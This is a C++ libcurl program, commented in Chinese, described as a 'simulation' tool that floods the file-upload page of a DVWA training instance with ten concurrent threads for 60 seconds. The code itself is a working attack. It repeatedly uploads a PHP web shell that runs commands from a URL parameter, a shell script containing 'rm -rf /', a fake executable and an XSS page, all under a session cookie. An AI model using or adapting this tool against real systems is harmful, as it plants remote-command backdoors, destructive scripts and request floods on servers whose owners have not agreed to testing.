/*
 * DVWA Uploading Attack Flood Tool
 * Simulation: Exploits File Upload Vulnerability with various payloads
 * Dependency: libcurl
 * Compile: g++ uploading_attack_flood.cpp -o uploading_attack_flood -lcurl -lpthread
 */

#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <chrono>
#include <curl/curl.h>

// === 配置区域 ===
// 1. DVWA 上传漏洞 URL
const std::string UPLOAD_URL = "http://192.168.0.114/dvwa/vulnerabilities/upload/";
// 2. Session ID (请替换为您登录后的 ID)
const std::string SESSION_ID = "vn1234567890abcdef123456"; 
const std::string SECURITY_LEVEL = "low"; 

const int THREAD_COUNT = 10;
const int ATTACK_DURATION = 60; // 60秒

// === 全局控制 ===
std::atomic<bool> is_running(true);
std::atomic<long> total_uploads(0);

// 模拟不同的恶意文件内容和名称
struct MaliciousFile {
    std::string filename;
    std::string content;
    std::string mimetype;
};

const std::vector<MaliciousFile> PAYLOADS = {
    // 模拟上传 WebShell
    {"shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"},
    // 模拟上传 Windows 恶意程序 (伪造内容)
    {"virus.exe", "MZ........(fake binary content)........", "application/octet-stream"},
    // 模拟上传 Linux 脚本
    {"exploit.sh", "#!/bin/bash\nrm -rf /", "text/x-shellscript"},
    // 模拟上传 HTML 钓鱼文件
    {"phishing.html", "<html><script>alert('XSS')</script></html>", "text/html"}
};

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp) {
    return size * nmemb;
}

void attack_worker(int thread_id) {
    CURL *curl = curl_easy_init();
    if (!curl) return;

    std::string cookie_str = "security=" + SECURITY_LEVEL + "; PHPSESSID=" + SESSION_ID;
    
    // 预设 CURL 选项
    curl_easy_setopt(curl, CURLOPT_COOKIE, cookie_str.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "CPP-Upload-Attacker/2.1");
    curl_easy_setopt(curl, CURLOPT_URL, UPLOAD_URL.c_str());
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L); // 上传文件可能较慢，给10秒超时

    while (is_running) {
        // 轮询或随机选择 Payload
        for (const auto& payload : PAYLOADS) {
            if (!is_running) break;

            curl_mime *mime;
            curl_mimepart *part;

            mime = curl_mime_init(curl);

            // 1. 构建文件部分 (name="uploaded")
            part = curl_mime_addpart(mime);
            curl_mime_name(part, "uploaded");
            curl_mime_data(part, payload.content.c_str(), CURL_ZERO_TERMINATED);
            curl_mime_filename(part, payload.filename.c_str());
            curl_mime_type(part, payload.mimetype.c_str());

            // 2. 构建按钮部分 (name="Upload") - 必不可少
            part = curl_mime_addpart(mime);
            curl_mime_name(part, "Upload");
            curl_mime_data(part, "Upload", CURL_ZERO_TERMINATED);

            // 3. 发送
            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
            CURLcode res = curl_easy_perform(curl);

            if (res == CURLE_OK) {
                long response_code;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                // 只要服务器收到了 (200 OK)，就算一次上传尝试
                if(response_code == 200) {
                    total_uploads++;
                }
            }

            curl_mime_free(mime);
            
            // 简单休眠防止瞬间过载
            // std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
    }
    
    curl_easy_cleanup(curl);
}

int main() {
    curl_global_init(CURL_GLOBAL_ALL);

    std::cout << "=== Uploading Attack Simulation Started ===" << std::endl;
    std::cout << "Target: " << UPLOAD_URL << std::endl;
    std::cout << "Threads: " << THREAD_COUNT << std::endl;

    std::vector<std::thread> threads;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        threads.emplace_back(attack_worker, i + 1);
    }

    // 倒计时
    std::this_thread::sleep_for(std::chrono::seconds(ATTACK_DURATION));
    is_running = false;

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n=== Finished ===" << std::endl;
    std::cout << "Total Upload Attempts: " << total_uploads.load() << std::endl;
    std::cout << "Avg RPS:               " << (total_uploads.load() / ATTACK_DURATION) << std::endl;

    curl_global_cleanup();
    return 0;
}